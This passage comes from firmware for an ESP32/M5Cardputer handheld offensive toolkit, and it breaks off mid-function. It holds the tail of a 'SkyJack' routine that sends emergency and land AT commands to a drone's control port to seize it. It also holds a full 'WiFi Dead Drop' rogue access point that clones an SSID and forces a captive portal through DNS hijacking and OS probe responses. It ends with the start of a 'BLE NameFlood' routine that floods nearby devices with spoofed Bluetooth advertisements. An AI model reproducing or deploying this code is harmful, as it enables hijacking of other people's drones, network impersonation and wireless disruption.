  // Ã‰tape 4 : EMERGENCY + LAND
  WiFiClient client;
  if (client.connect("192.168.1.1", 5556)) {
    for (int i = 0; i < 5; i++) {
      sendATCommandToDrone(client, "290717952"); // Emergency
      delay(50);
      sendATCommandToDrone(client, "290717696"); // Land
      delay(50);
    }
    client.stop();
    drawSkyjackStatus("Commands sent.");
  } else {
    drawSkyjackStatus("Drone not responding.");
  }

  delay(1000);
  WiFi.disconnect(true);
  waitAndReturnToMenu("SkyJack done.");
}

























#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>

volatile int ddActiveTransfers = 0;  // number of in-flight uploads/downloads

// =================== Dead Drop Dashboard Globals =====================
const char* DD_BASE = "/evil/deaddrop";
bool ddActive = false;

// Counters
volatile unsigned long ddUploadsCount   = 0;
volatile unsigned long ddDownloadsCount = 0;
volatile unsigned long ddNotesCount     = 0;
volatile unsigned long ddBytesIn        = 0;
volatile unsigned long ddBytesOut       = 0;

// History buffers
const int DD_HIST_LEN = 64;
uint8_t ddClientsHist[DD_HIST_LEN];
uint8_t ddInHist[DD_HIST_LEN];   // upload history
uint8_t ddOutHist[DD_HIST_LEN];  // download history
int ddHistHead = 0;

// UI cache
int uiLastClients = -1;
int uiLastFiles   = -1;
unsigned long uiLastUp   = (unsigned long) - 1;
unsigned long uiLastDown = (unsigned long) - 1;
unsigned long uiLastNotes = (unsigned long) - 1;
unsigned long ddLastBytesIn  = 0;
unsigned long ddLastBytesOut = 0;
unsigned long ddLastTickMs   = 0;

// Async server dedicated to DeadDrop
AsyncWebServer ddServer(80);

// UI task
TaskHandle_t ddUiTaskHandle = NULL;

// =================== Helpers =====================
String ddUrlEncode(const String& in) {
  String o; o.reserve(in.length() * 3);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    bool safe = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~';
    if (safe) o += c;
    else {
      char buf[4];
      snprintf(buf, sizeof(buf), "%%%02X", (unsigned char)c);
      o += buf;
    }
  }
  return o;
}

String ddHtmlEscape(const String& in) {
  String o; o.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    if (c == '&') o += "&amp;";
    else if (c == '<') o += "&lt;";
    else if (c == '>') o += "&gt;";
    else if (c == '"') o += "&quot;";
    else o += c;
  }
  return o;
}

String ddMimeFromExt(const String& name) {
  int dot = name.lastIndexOf('.');
  String ext = (dot >= 0) ? name.substring(dot + 1) : "";
  ext.toLowerCase();
  if (ext == "txt") return "text/plain";
  if (ext == "htm" || ext == "html") return "text/html";
  if (ext == "json") return "application/json";
  if (ext == "jpg" || ext == "jpeg") return "image/jpeg";
  if (ext == "png") return "image/png";
  if (ext == "gif") return "image/gif";
  if (ext == "pdf") return "application/pdf";
  if (ext == "csv") return "text/csv";
  if (ext == "mp3") return "audio/mpeg";
  if (ext == "mp4") return "video/mp4";
  if (ext == "zip") return "application/zip";
  return "application/octet-stream";
}

String ddSafeName(const String& in) {
  String s = in;
  s.replace("\\", "_"); s.replace("/", "_"); s.replace("..", "_");
  s.replace("%", "_"); s.replace(":", "_");
  s.replace("\"", "_"); s.replace("'", "_");
  s.trim();
  if (s.length() == 0) s = "drop.bin";
  return s;
}

int ddCountFiles() {
  int n = 0;
  File dir = SD.open(DD_BASE);
  if (!dir) return 0;
  while (true) {
    File f = dir.openNextFile();
    if (!f) break;
    if (!f.isDirectory()) n++;
    f.close();
  }
  dir.close();
  return n;
}

// =================== Dashboard Drawing =====================
const int T_W = 72, T_H = 28;
const int T_CL_X = 6,   T_CL_Y = 48;
const int T_UP_X = 84,  T_UP_Y = 48;
const int T_DW_X = 162, T_DW_Y = 48;
const int T_FL_X = 6,   T_FL_Y = 78, T_FL_H = 24;
const int T_IO_X = 84,  T_IO_Y = 78, T_IO_W = 150, T_IO_H = 24;

void ddDrawHeader(const char* title) {
  M5.Display.fillRect(0, 0, 240, 18, TFT_DARKCYAN);
  M5.Display.drawFastHLine(0, 18, 240, TFT_BLACK);
  M5.Display.setTextColor(TFT_BLACK, TFT_DARKCYAN);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(6, 4); M5.Display.print(title);
}

void ddDrawTextLine(int x, int y, const char* label, const char* value) {
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5.Display.setCursor(x, y); M5.Display.print(label);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(x + 56, y); M5.Display.print(value);
}

void ddDrawTileFrame(int x, int y, int w, int h, const char* caption) {
  M5.Display.drawRoundRect(x, y, w, h, 5, TFT_DARKGREY);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5.Display.setCursor(x + 6, y + 4); M5.Display.print(caption);
  int clearY = y + 13;
  M5.Display.fillRect(x + 1, clearY, w - 2, h - (clearY - y) - 2, TFT_BLACK);
}

void ddDrawSparkline(int x, int y, int w, int h,
                     uint8_t* hist, int len, int head,
                     uint16_t color, bool clear = true) {
  if (clear) {
    M5.Display.fillRect(x, y, w, h, TFT_BLACK);
    for (int gx = 0; gx < w; gx += 16) M5.Display.drawFastVLine(x + gx, y, h, TFT_DARKGREY);
    for (int gy = 0; gy < h; gy += 10) M5.Display.drawFastHLine(x, y + gy, w, TFT_DARKGREY);
  }

  if (len < 2) return;
  int prevX = x;
  int idx0  = head % len;
  int v0    = hist[idx0];
  int prevY = y + h - 1 - (v0 * (h - 1)) / 100;

  for (int i = 1; i < len; ++i) {
    int idx = (head + i) % len;
    int v   = hist[idx];
    int px  = x + (i * (w - 1)) / (len - 1);
    int py  = y + h - 1 - (v * (h - 1)) / 100;
    M5.Display.drawLine(prevX, prevY, px, py, color);
    prevX = px; prevY = py;
  }
}


void ddDashboardInit(const char* ssid, const String& ip) {
  M5.Display.fillScreen(TFT_BLACK);
  ddDrawHeader("WiFi Dead Drop");

  ddDrawTextLine(6, 22, "SSID", ssid);
  ddDrawTextLine(6, 34, "IP  ", ip.c_str());

  ddDrawTileFrame(6,   48, 72, 28, "Clients");
  ddDrawTileFrame(84,  48, 72, 28, "Uploads");
  ddDrawTileFrame(162, 48, 72, 28, "Downloads");
  ddDrawTileFrame(6,   78, 72, 24, "Files");
  ddDrawTileFrame(84,  78, 150,24, "IO KB/s (up/down)");

  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5.Display.setCursor(6,   106); M5.Display.print("Clients");
  M5.Display.setCursor(126, 106); M5.Display.print("Throughput");

  // Clients graph
  ddDrawSparkline(6,   115, 108, 18, ddClientsHist, DD_HIST_LEN, ddHistHead, TFT_GREEN, true);
  // Throughput: overlay two curves (cyan = upload, yellow = download)
  ddDrawSparkline(126, 115, 108, 18, ddInHist,  DD_HIST_LEN, ddHistHead, TFT_CYAN,   true);
  ddDrawSparkline(126, 115, 108, 18, ddOutHist, DD_HIST_LEN, ddHistHead, TFT_YELLOW, false);
}


inline void ddDrawValueInTile(int x, int y, int w, int h, const char* txt) {
  int clearY = y + 13;
  M5.Display.fillRect(x + 1, clearY, w - 2, h - (clearY - y) - 2, TFT_BLACK);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(x + 6, y + h - 10); M5.Display.print(txt);
}

void ddUpdateTileClients(int v) {
  if (v == uiLastClients) return;
  uiLastClients = v;
  char buf[8];
  snprintf(buf, sizeof(buf), "%d", v);
  ddDrawValueInTile(T_CL_X, T_CL_Y, T_W, T_H, buf);
}
void ddUpdateTileUploads(unsigned long v) {
  if (v == uiLastUp) return;
  uiLastUp = v;
  char buf[12];
  snprintf(buf, sizeof(buf), "%lu", v);
  ddDrawValueInTile(T_UP_X, T_UP_Y, T_W, T_H, buf);
}
void ddUpdateTileDownloads(unsigned long v) {
  if (v == uiLastDown) return;
  uiLastDown = v;
  char buf[12];
  snprintf(buf, sizeof(buf), "%lu", v);
  ddDrawValueInTile(T_DW_X, T_DW_Y, T_W, T_H, buf);
}
void ddUpdateTileFiles(int v) {
  if (v == uiLastFiles) return;
  uiLastFiles = v;
  char buf[12];
  snprintf(buf, sizeof(buf), "%d", v);
  ddDrawValueInTile(T_FL_X, T_FL_Y, T_W, T_FL_H, buf);
}
void ddUpdateTileIO(unsigned long inKBs, unsigned long outKBs) {
  char buf[24];
  snprintf(buf, sizeof(buf), "%lu / %lu", inKBs, outKBs);
  ddDrawValueInTile(T_IO_X, T_IO_Y, T_IO_W, T_IO_H, buf);
}

void ddPushHistory(uint8_t clientsScaled, uint8_t inScaled, uint8_t outScaled) {
  ddClientsHist[ddHistHead] = clientsScaled;
  ddInHist[ddHistHead]      = inScaled;
  ddOutHist[ddHistHead]     = outScaled;
  ddHistHead = (ddHistHead + 1) % DD_HIST_LEN;

  // Redraw graphs
  ddDrawSparkline(6,   115, 108, 18, ddClientsHist, DD_HIST_LEN, ddHistHead, TFT_GREEN, true);
  ddDrawSparkline(126, 115, 108, 18, ddInHist,      DD_HIST_LEN, ddHistHead, TFT_CYAN,   true);
  ddDrawSparkline(126, 115, 108, 18, ddOutHist,     DD_HIST_LEN, ddHistHead, TFT_YELLOW, false);
}



void ddUiTask(void* pv) {
  memset(ddClientsHist, 0, sizeof(ddClientsHist));
  memset(ddInHist,      0, sizeof(ddInHist));
  memset(ddOutHist,     0, sizeof(ddOutHist));
  ddHistHead = 0;

  ddLastBytesIn  = ddBytesIn;
  ddLastBytesOut = ddBytesOut;
  ddLastTickMs   = millis();

  while (ddActive) {
    dnsServer.processNextRequest();
    unsigned long now = millis();
    if (now - ddLastTickMs >= 400) {
      unsigned long tickMs = now - ddLastTickMs;
      ddLastTickMs = now;

      int clients = WiFi.softAPgetStationNum();
      int files   = ddCountFiles();

      unsigned long inDelta  = ddBytesIn  - ddLastBytesIn;
      unsigned long outDelta = ddBytesOut - ddLastBytesOut;
      ddLastBytesIn  = ddBytesIn;
      ddLastBytesOut = ddBytesOut;

      unsigned long inKBs  = (inDelta  * 1000UL) / (tickMs * 1024UL);
      unsigned long outKBs = (outDelta * 1000UL) / (tickMs * 1024UL);

      ddUpdateTileClients(clients);
      ddUpdateTileUploads(ddUploadsCount);
      ddUpdateTileDownloads(ddDownloadsCount);
      ddUpdateTileFiles(files);
      ddUpdateTileIO(inKBs, outKBs);

      uint8_t clientsScaled = (clients > 10) ? 100 : (uint8_t)(clients * 10);
      if (inKBs  > 200) inKBs  = 200;
      if (outKBs > 200) outKBs = 200;
      uint8_t inScaled  = (uint8_t)((inKBs  * 100UL) / 200UL);
      uint8_t outScaled = (uint8_t)((outKBs * 100UL) / 200UL);

      ddPushHistory(clientsScaled, inScaled, outScaled);
    }
    vTaskDelay(pdMS_TO_TICKS(25));
  }
  vTaskDelete(NULL);
}




// =================== HTTP Handlers =====================
void setupDeadDropRoutes() {
  // Landing page
  ddServer.on("/", HTTP_GET, [](AsyncWebServerRequest * req) {
    String html;
    html += "<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<title>WiFi Dead Drop</title>";
    html += "<style>";
    html += "body{background:#111;color:#ddd;font-family:Consolas,monospace;text-align:center;margin:0;padding:0;}";
    html += ".container{max-width:500px;margin:40px auto;padding:20px;}";
    html += "h2{color:#0ff;margin-bottom:10px;text-shadow:0 0 6px #0ff;}";
    html += "h3{color:#0ff;margin-top:30px;}";
    html += "p{font-size:14px;line-height:1.5;color:#aaa;}";
    html += ".block{width:100%;margin:8px 0;box-sizing:border-box;}";
    html += "input,textarea,button{width:100%;padding:10px;border:1px solid #0ff;background:#111;color:#0ff;font-family:Consolas,monospace;font-size:14px;display:block;}";
    html += "textarea{resize:vertical;}";
    html += "button{cursor:pointer;transition:all 0.2s;}button:hover{background:#0ff;color:#111;}";
    html += "progress{width:100%;height:14px;margin:8px 0;}";
    html += "#status{font-size:13px;margin-top:6px;color:#aaa;}";
    html += "a{color:#0ff;text-decoration:none;}a:hover{text-decoration:underline;}";
    html += "@media(max-width:600px){.container{max-width:100%;margin:0;padding:15px;}}";
    html += "</style></head><body>";
  
    html += "<div class='container'>";
    html += "<h2>WiFi Dead Drop</h2>";
    html += "<p>Welcome to the underground dead drop. Share files or leave notes.</p>";
  
    // Upload section
    html += "<h3>Upload a File</h3>";
    html += "<input id='f' class='block' type='file'>";
    html += "<button class='block' onclick='up()'>Upload</button>";
    html += "<progress id='prog' value='0' max='100' style='display:none'></progress>";
    html += "<div id='status'></div>";
  
    // Note section
    html += "<h3>Leave a Note</h3>";
    html += "<form method='post' action='/dd-note'>";
    html += "<textarea class='block' name='msg' rows='3' maxlength='1024' placeholder='Drop your message here...'></textarea>";
    html += "<button class='block' type='submit'>Publish</button></form>";
  
    // Link to deposits
    html += "<p style='margin-top:20px'><a href='/dd-list'>&#128193; View Deposits</a></p>";
  
    // Footer
    html += "<hr style='border:0;border-top:1px solid #333;margin:20px 0'>";
    html += "<small>Connected to <span style='color:#0ff'>" + WiFi.softAPIP().toString() + "</span></small>";
  
    // Script with percent + speed + transferred
    html += "<script>";
    html += "function human(x){if(x<1024)return x+' B';if(x<1048576)return(x/1024).toFixed(1)+' KB';if(x<1073741824)return(x/1048576).toFixed(1)+' MB';return(x/1073741824).toFixed(1)+' GB';}";
    html += "function up(){";
    html += " var f=document.getElementById('f').files[0];";
    html += " if(!f){alert('Select a file');return;}";
    html += " var p=document.getElementById('prog');";
    html += " var s=document.getElementById('status');";
    html += " p.style.display='block';p.value=0;s.textContent='Starting upload...';";
    html += " var start=Date.now();";
    html += " var xhr=new XMLHttpRequest();xhr.open('POST','/dd-upload',true);";
    html += " xhr.upload.onprogress=function(e){";
    html += "   if(e.lengthComputable){";
    html += "     var percent=Math.floor((e.loaded/e.total)*100);";
    html += "     var elapsed=(Date.now()-start)/1000;";
    html += "     var speed=(e.loaded/1024/elapsed).toFixed(1);";
    html += "     p.value=percent;";
    html += "     s.textContent='Uploading '+percent+'% ('+human(e.loaded)+' / '+human(e.total)+', '+speed+' KB/s)';";
    html += "   }";
    html += " };";
    html += " xhr.onload=function(){s.textContent='Upload complete';window.location='/dd-list';};";
    html += " xhr.onerror=function(){s.textContent='Upload failed';};";
    html += " var form=new FormData();form.append('data',f,f.name);xhr.send(form);";
    html += "}";
    html += "</script>";
  
    html += "</div></body></html>";
    req->send(200, "text/html", html);
  });




  ddServer.on("/dd-list", HTTP_GET, [](AsyncWebServerRequest * req) {
    File dir = SD.open(DD_BASE);
    if (!dir || !dir.isDirectory()) {
      req->send(500, "text/plain", "SD not ready");
      return;
    }
    String html = "<!doctype html><html><head><meta charset='utf-8'>";
    html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<title>Deposits</title><style>";
    html += "body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;margin:20px;}";
    html += "h3{color:#ff00aa;text-shadow:0 0 8px #ff00aa;}";
    html += "a{color:#00b7ff;text-decoration:none;}a:hover{text-shadow:0 0 6px #00b7ff;}";
    html += "table{width:100%;border-collapse:collapse;margin-top:10px;}";
    html += "th,td{text-align:left;padding:6px;border-bottom:1px solid #222;}";
    html += "th{color:#0ff;font-size:14px;} td{font-size:13px;}";
    html += "</style></head><body>";
    html += "<h3>ðŸ“‚ Uploaded Files</h3>";
    html += "<table><tr><th>Name</th><th>Size</th></tr>";
    while (true) {
      File f = dir.openNextFile();
      if (!f) break;
      if (!f.isDirectory()) {
        String base = f.name(); int p = base.lastIndexOf('/'); if (p >= 0) base = base.substring(p + 1);
        unsigned long sz = f.size();
        String sizeStr;
        if (sz > 1000000000) sizeStr = String((float)sz / 1000000000.0, 2) + " GB";
        else if (sz > 1000000) sizeStr = String((float)sz / 1000000.0, 2) + " MB";
        else if (sz > 1000) sizeStr = String((float)sz / 1000.0, 1) + " KB";
        else sizeStr = String(sz) + " B";
        html += "<tr><td><a href='/dd-get?f=" + ddUrlEncode(base) + "'>" + ddHtmlEscape(base) + "</a></td><td>" + sizeStr + "</td></tr>";
      }
      f.close();
    }
    dir.close();
    html += "</table><p><a href='/'>â¬… Back</a></p></body></html>";
    req->send(200, "text/html", html);
  });


  // ---- Download (counts bytes per chunk + safe shutdown) ----
  ddServer.on("/dd-get", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->hasParam("f")) { req->send(400, "text/plain", "Missing f"); return; }
  
    String f = ddSafeName(req->getParam("f")->value());
    String path = String(DD_BASE) + "/" + f;
  
    if (!SD.exists(path)) { req->send(404, "text/plain", "Not found"); return; }
  
    File file = SD.open(path, FILE_READ);
    if (!file) { req->send(500, "text/plain", "Failed to open file"); return; }
  
    const size_t fileSize = file.size();
    const String mime     = ddMimeFromExt(f);
  
    ddActiveTransfers++;  // <--- mark running transfer
  
    AsyncWebServerResponse *resp = req->beginResponse(
      mime, fileSize,
      [file](uint8_t *buffer, size_t maxLen, size_t index) mutable -> size_t {
        // If UI asked to exit, stop cleanly
        if (!ddActive) {
          if (file) file.close();
          ddActiveTransfers--;
          return 0;
        }
  
        if (!file.available()) {
          if (file) file.close();
          ddDownloadsCount++;
          ddActiveTransfers--;
          return 0; // done
        }
  
        size_t n = file.read(buffer, maxLen);
        ddBytesOut += n;  // live accounting for throughput
        return n;
      }
    );
  
    resp->addHeader("Content-Disposition",
                    "attachment; filename=\"" + f + "\"; filename*=UTF-8''" + ddUrlEncode(f));
    req->send(resp);
  });




  // Store notes
  ddServer.on("/dd-note", HTTP_POST, [](AsyncWebServerRequest * req) {
    if (req->hasParam("msg", true)) {
      String msg = req->getParam("msg", true)->value(); msg.trim();
      if (!SD.exists(DD_BASE)) SD.mkdir(DD_BASE);
      if (msg.length() > 0) {
        File notes = SD.open(String(DD_BASE) + "/notes.txt", FILE_APPEND);
        if (notes) {
          notes.println(msg);
          notes.close();
          ddNotesCount++;
        }
      }
    }
    req->redirect("/dd-list");
  });

  ddServer.on("/dd-upload", HTTP_POST,
    [](AsyncWebServerRequest * req) {
      req->send(200, "text/plain", "OK");
    },
    [](AsyncWebServerRequest * req, String filename, size_t index, uint8_t *data, size_t len, bool final) {
      // If weâ€™re shutting down, ignore new chunks
      if (!ddActive) return;
  
      String safe = ddSafeName(filename);
      String path = String(DD_BASE) + "/" + safe;
  
      if (index == 0) {
        if (!SD.exists(DD_BASE)) SD.mkdir(DD_BASE);
        req->_tempFile = SD.open(path, FILE_WRITE);
        ddActiveTransfers++;  // <--- start of a new upload
        Serial.printf("[DD] Upload start: %s\n", path.c_str());
      }
  
      if (req->_tempFile) {
        req->_tempFile.write(data, len);
        ddBytesIn += len;
      }
  
      if (final) {
        if (req->_tempFile) {
          req->_tempFile.close();
          ddUploadsCount++;
        }
        ddActiveTransfers--;  // <--- upload finished
        Serial.printf("[DD] Upload done: %s\n", path.c_str());
      }
    }
  );

  // Status JSON
  ddServer.on("/dd-status", HTTP_GET, [](AsyncWebServerRequest * req) {
    String json = "{\"clients\":" + String(WiFi.softAPgetStationNum()) +
                  ",\"uploads\":" + String(ddUploadsCount) +
                  ",\"downloads\":" + String(ddDownloadsCount) +
                  ",\"notes\":" + String(ddNotesCount) +
                  ",\"bytesIn\":" + String(ddBytesIn) +
                  ",\"bytesOut\":" + String(ddBytesOut) + "}";
    req->send(200, "application/json", json);
  });

  // ---- Captive Portal helpers (must be BEFORE onNotFound) ----

  // Android probes
  ddServer.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r){
    // Return 200 (not 204) to force captive portal UI
    r->send(200, "text/plain", "OK");
  });
  ddServer.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send(200, "text/plain", "OK");
  });
  
  // Apple probes
  ddServer.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r){
    // Many iOS versions look for the word "Success"
    r->send(200, "text/html", "<html><head><title>Success</title></head><body>Success</body></html>");
  });
  
  // Windows probes
  ddServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send(200, "text/plain", "Microsoft NCSI");
  });
  ddServer.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send(200, "text/plain", "Microsoft Connect Test");
  });
  
  // Common extras
  ddServer.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send(204); // no content
  });
  
  // Catch-all: redirect any unknown path to landing page
  ddServer.onNotFound([](AsyncWebServerRequest *r){
    // Some OS expect 302; others are fine with 200 HTML. 302 is the safest.
    r->redirect("/");
  });

}
void WifiDeadDrop() {
  // Stop the main (blocking) portal if it was running elsewhere.
  dnsServer.stop();
  server.stop();

  isOperationInProgress = true;

  if (!SD.exists(DD_BASE)) SD.mkdir(DD_BASE);

  char ssidBuf[64];
  strncpy(ssidBuf, clonedSSID.c_str(), sizeof(ssidBuf) - 1);
  ssidBuf[sizeof(ssidBuf) - 1] = '\0';

  // Bring up AP for DeadDrop
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(ssidBuf, nullptr, 1, false, 10);

  ipAP  = WiFi.softAPIP();
  ipSTA = WiFi.localIP();

  esp_wifi_set_ps(WIFI_PS_NONE);

  // Captive DNS for DeadDrop
  dnsServer.start(53, "*", ipAP);

  // Async HTTP routes
  setupDeadDropRoutes();
  ddServer.begin();

  // UI
  ddDashboardInit(ssidBuf, ipAP.toString());

  ddActive = true;

  // Start UI task pinned to core 1 (GFX friendly)
  xTaskCreatePinnedToCore(ddUiTask, "ddUiTask", 4096, NULL, 1, &ddUiTaskHandle, 1);

  // --------- service loop (exit on BKSP) ----------
  while (ddActive) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      ddActive = false;               // signal all loops/callbacks to wind down
      break;
    }
    delay(1);
  }

  // --------------- graceful shutdown ----------------

  // 1) Let UI task exit naturally (no hard delete during SPI draw).
  if (ddUiTaskHandle != NULL) {
    // give it time to see ddActive==false and return
    unsigned long t0 = millis();
    while (eTaskGetState(ddUiTaskHandle) != eDeleted && (millis() - t0) < 800UL) {
      vTaskDelay(pdMS_TO_TICKS(20));
    }
    if (eTaskGetState(ddUiTaskHandle) != eDeleted) {
      // last resort if something kept it alive
      vTaskDelete(ddUiTaskHandle);
    }
    ddUiTaskHandle = NULL;
  }

  // 2) Now it is safe to stop DNS (UI task won't call processNextRequest anymore).
  dnsServer.stop();

  // 3) Stop accepting new HTTP connections; keep current ones alive.
  //    (Some library versions have end(); if not, reset() will be used later.)
#if defined(ESPASYNC_WEBSERVER_H) || defined(ASYNC_WEBSERVER_VERSION)
  ddServer.end();
#endif

  // 4) Drain in-flight transfers (uploads/downloads) for up to ~1.5s.
  //    Your /dd-get and /dd-upload handlers must increment/decrement ddActiveTransfers.
  unsigned long ddDrainStart = millis();
  while (ddActiveTransfers > 0 && (millis() - ddDrainStart) < 1500UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  // 5) Hard close any leftovers (safe even if end() already ran).
  ddServer.reset();

  // 6) Bring AP down after sockets are closed.
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_APSTA);   // keep STA up for the rest of the app

  waitAndReturnToMenu("Dead Drop stopped");
}



/*
  ============================================================================================================================
  // ======== BLE Name flood ========
  ============================================================================================================================
*/
String generateRandomBLEName_Full() {
  static const char* ascii = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&*-_=+?";
  const int asciiCount = strlen(ascii);

  static const char* emojis[] = {
    "ðŸ˜ˆ", "ðŸ’£", "âš¡", "ðŸ’€", "ðŸ”¥", "ðŸ‘¾", "ðŸš¨", "ðŸ“¡", "ðŸ”ž", "ðŸ”", "ðŸ’¥", "ðŸ§ "
  };
  const int emojiCount = sizeof(emojis) / sizeof(emojis[0]);

  String out; out.reserve(32);
  size_t used = 0;

  while (used < 29) {
    bool pickEmoji = (rand() % 100) < 35;
    if (pickEmoji) {
      const char* e = emojis[rand() % emojiCount];
      size_t eb = strlen(e);
      if (used + eb <= 29) {
        out += e;
        used += eb;
        continue;
      }
    }
    if (used + 1 <= 29) {
      out += ascii[rand() % asciiCount];
      used += 1;
    }
  }
  return out;
}


// ======================================================
//  Helpers UI
// ======================================================
inline void uiHeader(const char* title) {
  M5.Display.fillRect(0, 0, 240, 135, TFT_BLACK);
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_CYAN);
  int tw = M5.Display.textWidth(title);
  M5.Display.setCursor((240 - tw) / 2, 8);
  M5.Display.println(title);

  M5.Display.fillRect(0, 28, 240, 2, TFT_PURPLE);
  M5.Display.drawRect(6, 34, 228, 88, TFT_PURPLE);

  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(8, 126);
  M5.Display.print("BACKSPACE: exit");
}

inline void uiStaticLabels(const char* modeText) {
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE);

  M5.Display.setCursor(14, 40);  M5.Display.print("MODE:");
  M5.Display.setCursor(14, 58);  M5.Display.print("NAME:");
  M5.Display.setCursor(14, 76);  M5.Display.print("ADS :");
  M5.Display.setCursor(14, 94);  M5.Display.print("TIME:");
  M5.Display.setCursor(130, 94); M5.Display.print("RATE:");

  M5.Display.setTextColor(TFT_YELLOW);
  M5.Display.setCursor(62, 40);
  M5.Display.print(modeText);

  M5.Display.fillCircle(220, 20, 4, TFT_RED);
}


// ===== SPEED UI LABEL =============================================
inline void uiUpdateSpeedLabel(int mode) {
  const char* txt[] = { "NORMAL", "TURBO", "SLOW" };
  uint16_t color[] = { TFT_DARKGREY, TFT_RED, TFT_BLUE };

  M5.Display.fillRect(130, 76, 100, 14, TFT_BLACK);
  M5.Display.setCursor(130, 76);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(color[mode]);
  M5.Display.print(txt[mode]);
}


// ===== RAINBOW WHEEL FOR TURBO MODE ================================
inline uint32_t wheel(byte pos) {
  if (pos < 85) return pixels.Color(pos * 3, 255 - pos * 3, 0);
  if (pos < 170) {
    pos -= 85;
    return pixels.Color(255 - pos * 3, 0, pos * 3);
  }
  pos -= 170; return pixels.Color(0, pos * 3, 255 - pos * 3);
}



// ======================================================
//             BLE NameFlood Main Function
// ======================================================
void bleNameFloodUI() {
  bool useRandom = confirmPopup("Use RANDOM names?");

  uiHeader("BLE NameFlood");
  uiStaticLabels(useRandom ? "RANDOM" : "SD FILE");
  uiUpdateSpeedLabel(0);

  std::vector<String> bleNames;
  if (!useRandom) {
    const char* filePath = "/evil/ble/names.txt";
    if (!SD.exists("/evil/ble")) SD.mkdir("/evil/ble");
    if (!SD.exists(filePath)) {
      File f = SD.open(filePath, FILE_WRITE);
      if (!f) {
        M5.Display.setTextColor(TFT_RED);
        M5.Display.setCursor(14, 60);
        M5.Display.println("Error creating /evil/ble/names.txt");
        delay(2000); inMenu = true; return;
      }
      f.println("EvilðŸ‘¹Beacon"); f.println("ðŸ’€HackMyPhone"); f.println("ðŸ˜ˆFreeVirusWiFi");
      f.println("ðŸ“¡BluetoothPolice"); f.println("ðŸ”¥PairedYouLOL"); f.println("ðŸ‘¾NotASpyDevice");
      f.println("ðŸ’£DeleteSystem32"); f.println("ðŸ˜±MomTurnOffTheBLE"); f.println("ðŸ¤–SkynetNode42");
      f.println("ðŸ”žAdultBLEOnly"); f.println("ðŸ§ MindControlBLE"); f.println("âš ï¸DoNotConnect");
      f.println("ðŸPythonInside"); f.println("ðŸ’¥BLEpocalypse"); f.println("ðŸª¦RIP_Bluetooth");
      f.println("ðŸ˜ˆISeeYourPhone"); f.println("ðŸ‘½Area51_Scanner"); f.println("ðŸ”¥Sith_Bluetooth");
      f.println("ðŸ’¾FirmwareUpdate??"); f.println("ðŸš¨NSA_Listener");
      f.close();
    }
    File file = SD.open(filePath);
    if (!file) {
      M5.Display.setTextColor(TFT_RED);
      M5.Display.setCursor(14, 60);
      M5.Display.println("SD read error.");
      delay(2000);
      inMenu = true;
      return;
    }
    while (file.available()) {
      String line = file.readStringUntil('\n'); line.trim();
      if (line.length() > 0) bleNames.push_back(line);
    }
    file.close();
    if (bleNames.empty()) {
      M5.Display.setTextColor(TFT_RED);
      M5.Display.setCursor(14, 60);
      M5.Display.println("No names in file!");
      delay(2000);
      inMenu = true;
      return;
    }
  }

  BLEDevice::init("Evil-Cardputer");
  esp_ble_gap_stop_advertising();
  BLEDevice::startAdvertising();
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setScanResponse(true);

  static esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x20, .adv_int_max = 0x40, .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM, .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };

  size_t index = 0;
  unsigned long lastSwitch = 0;
  unsigned long startTs = millis();
  unsigned long switchInterval = 55;
  unsigned long pubCount = 0, prevCount = 0, lastRateTs = millis();
  float rate = 0.0f;
  int speedMode = 0;
  uint8_t rainbowPos = 0;
  uint8_t ledState = 0;

  M5.Display.fillCircle(220, 20, 4, TFT_GREEN);

  auto printName = [&](const String & nm) {
    M5.Display.fillRect(62, 56, 166, 16, TFT_BLACK);
    M5.Display.fillRect(62, 74, 60, 16, TFT_BLACK);
    M5.Display.fillRect(50, 92, 70, 16, TFT_BLACK);
    M5.Display.fillRect(170, 92, 50, 16, TFT_BLACK);

    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_CYAN);
    M5.Display.setCursor(62, 58);
    String shown = nm; if (shown.length() > 18) shown = shown.substring(0, 18);
    M5.Display.print(shown);

